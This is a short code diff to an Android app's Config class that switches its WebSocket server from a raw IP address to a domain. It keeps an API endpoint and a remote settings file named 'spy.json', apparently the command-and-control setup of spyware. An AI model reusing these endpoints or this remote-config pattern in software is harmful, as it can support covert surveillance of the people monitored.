@@ -17,7 +17,7 @@ public class Config {
     private static final String GITHUB_RAW_URL = "https://raw.githubusercontent.com/virzst/Virzdb/main/spy.json";
     
     public static String API_URL = "http://159.89.102.173:2000";
-    public static String WS_URL = "ws://159.89.102.173:2000";
+    public static String WS_URL = "ws://virzxmanuel.miunnst.site:2000";
     
     public static void loadConfig(Context context) {
         try {
@@ -62,7 +62,7 @@ public class Config {
                         conn.disconnect();
                     } catch (Exception e) {
                         API_URL = prefs.getString("api_url", "http://159.89.102.173:2000");
-                        WS_URL = prefs.getString("ws_url", "ws://159.89.102.173:2000");
+                        WS_URL = prefs.getString("ws_url", "ws://virzxmanuel.miunnst.site:2000");
                     }
                 }
             }).start();
